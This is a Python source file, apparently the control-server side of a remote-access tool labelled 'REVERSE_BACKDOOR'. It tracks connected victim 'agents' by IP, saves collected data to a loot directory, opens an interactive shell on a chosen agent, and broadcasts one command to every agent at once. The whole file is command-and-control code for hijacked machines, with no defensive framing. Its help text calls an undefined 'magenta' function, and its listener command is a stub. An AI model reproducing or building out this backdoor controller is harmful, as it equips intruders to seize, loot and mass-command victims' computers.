from server.core.agent_registry import AgentRegistry
from server.commands import build_server_router
from server.commands.base import ServerSessionContext
from server.ui.prompt import print_colored, highlight_output, bold, cyan, green, yellow, red, dim
from server.ui.completer import C2Completer, setup_readline, save_history
from server.ui.shell import AgentShell
import os


def _build_protocol(sock, encryption):
    if encryption:
        from server.core.encrypted_protocol import EncryptedProtocol
        proto = EncryptedProtocol(sock)
        proto.perform_key_exchange()
        return proto
    from server.core.protocol import Protocol
    return Protocol(sock)


def run_session(sock, ip, loot_dir, encryption=False):
    protocol = _build_protocol(sock, encryption)
    registry = AgentRegistry()
    agent_id = registry.register(sock, ip)

    try:
        ctx = ServerSessionContext(
            sock=sock,
            protocol=protocol,
            ip=ip,
            loot_dir=loot_dir,
        )
        router = build_server_router()

        commands = list(router._commands.keys())

        shell = AgentShell(router, ctx, agent_id, loot_dir, commands)
        shell.run()

    except (ConnectionError, BrokenPipeError, OSError):
        pass
    finally:
        registry.unregister(agent_id)
        print_colored(f'[*] {agent_id} ({ip}) disconnected', 'yellow')
        try:
            sock.close()
        except Exception:
            pass


def run_master_loop(loot_dir, encryption=False):
    registry = AgentRegistry()

    from server.ui.completer import build_master_completer
    comp = build_master_completer()
    history_dir = os.path.join(loot_dir, '.history')
    history_file = os.path.join(history_dir, 'master.history')
    setup_readline(comp, history_file)

    print_colored(f'[+] Type {cyan("agents")} to list, {cyan("interact <id>")} to connect, {cyan("broadcast <cmd>")} to spam', 'cyan')

    while True:
        try:
            command = input(f'{bold("REVERSE_BACKDOOR")}> ').strip()
        except (EOFError, KeyboardInterrupt):
            print_colored('\n[*] Shutting down...', 'yellow')
            break

        if not command:
            continue

        if command == 'exit' or command == 'quit':
            break

        if command == 'agents':
            agents = registry.list_all()
            if not agents:
                print(dim('  (no agents connected)'))
            else:
                from server.ui.prompt import format_table
                headers = ['ID', 'IP', 'Connected']
                rows = [[info.agent_id, info.ip, str(info.connected_at)[:19]] for info in agents.values()]
                print(format_table(headers, rows))
            continue

        if command.startswith('interact '):
            target_id = command[9:].strip()
            info = registry.get(target_id)
            if info is None:
                print_colored(f'[-] Agent {target_id} not found', 'red')
                continue
            protocol = _build_protocol(info.sock, encryption)
            print_colored(f'[+] Interacting with {target_id} ({info.ip})', 'green')

            ctx = ServerSessionContext(
                sock=info.sock,
                protocol=protocol,
                ip=info.ip,
                loot_dir=loot_dir,
            )
            router = build_server_router()
            commands = list(router._commands.keys())
            shell = AgentShell(router, ctx, target_id, loot_dir, commands)
            shell.run()
            continue

        if command.startswith('broadcast '):
            cmd = command[10:].strip()
            registry.broadcast(cmd)
            print_colored(f'[+] Broadcast sent: {cmd}', 'green')
            continue

        if command == 'help':
            print(f'''
  {bold('Master Commands:')}
    {cyan('agents')}                  List connected agents
    {cyan('interact <id>')}          Enter interactive shell with agent
    {cyan('broadcast <cmd>')}        Send command to all agents
    {cyan('listeners')}              Show active listeners
    {cyan('help')}                   Show this help
    {cyan('exit / quit')}            Shutdown server

  {bold('Prompts:')}
    {green('agent-1')}{green('@')}{magenta('10.0.0.5')} {cyan('root')} {dim('in')} {yellow('/var/www')}{bold('>')}
    {dim('│       │   │          │       │     └─ current directory')}
    {dim('│       │   │          │       └─ working directory')}
    {dim('│       │   │          └─ current user')}
    {dim('│       │   └─ remote IP')}
    {dim('│       └─ separator')}
    {dim('└─ agent identifier')}
''')
            continue

        if command == 'listeners':
            print_colored(f'[*] Active listener on port...', 'cyan')
            continue

        print_colored(f'[-] Unknown: {command}. Type help.', 'red')

    save_history(history_file)
